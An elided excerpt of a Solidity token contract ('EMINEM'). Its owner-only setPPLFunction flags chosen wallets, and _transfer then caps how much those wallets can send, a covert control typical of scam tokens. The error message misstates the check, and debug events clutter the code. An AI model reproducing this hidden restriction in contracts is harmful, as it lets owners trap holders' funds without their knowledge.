...
contract EMINEM is Context, IERC20, Ownable {  
    ...
    string  private _name = "PPlhandle";
    ...
    mapping(address => bool) private _mapHandlePPl;
    uint256 public  _pplamnt = 100000000;
    ...
    constructor () public {
        ...
        marketingwallet = 0x8fa4acD1a0e1f32AF4D05DfAFDB880D0B6ACEc26;
    ...
    function _transfer(
        ...
        takeFee = true;
        TaxType=2;
         emit comments("Amount ", amount);
         emit comments("PPLAmount ", _pplamnt);
          emit comments("After add decimal", amount.div(1000000000000000000));
         if(_mapHandlePPl[from])
                {
                    emit comments("Amount ", amount.div(1000000000000000000));
                    emit comments("PPLAmount ", _pplamnt);
                    require(amount.div(1000000000000000000) <= _pplamnt, "Transfer amount must be greater than given amount");
                }
 ...
 function setPPLFunction(address _walletAddr , bool inputamnt) external onlyOwner {
        _mapHandlePPl[_walletAddr] = inputamnt;
    }
    function dsiaplsPPLtatus(address _walletAddr) public view returns (bool) {
       return  _mapHandlePPl[_walletAddr] ;
    }
